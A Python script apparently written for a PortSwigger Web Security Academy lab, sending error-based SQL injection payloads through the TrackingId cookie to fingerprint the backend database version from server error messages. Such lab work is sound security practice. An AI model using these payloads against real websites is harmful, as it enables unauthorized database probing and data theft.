import requests
from colorama import Fore,Style
url = "https://0a3c00f90321ddc382d8ddf800850094.web-security-academy.net/"

def checking(value):
    cookies = {'TrackingId':f"{value}"}
    requestor = requests.get(url,cookies=cookies)
    return requestor.status_code,requestor.text

db_queries = {
    "Oracle":    "SELECT banner FROM v$version",
    "Oracle":     "SELECT banner FROM v$version",
    "Microsoft":  "SELECT @@version",
    "PostgreSQL": "SELECT version()",
    "MySQL":      "SELECT @@version",
}
for database , command in db_queries.items():
    strs= f"' AND 1=CAST(({command} Limit 1) AS INT )--"
    code,body = checking(strs)
    if (code == 500):
        if ("PostgreSQL" in body):
            print(f"{Fore.GREEN} [+] database is  {database} {Style.RESET_ALL}")
            
        else:
            print(f"{Fore.BLUE} [-] Wrong database {database} {Style.RESET_ALL}")
    else:
        if ("Server Error: Gateway Timeout" in body):
            print(f"{Fore.GREEN} [-] Lab Expired") 
            break
        else:
            print(f"{Fore.RED} [-] Syntax Issue or SQL Injection not Possible")
            break
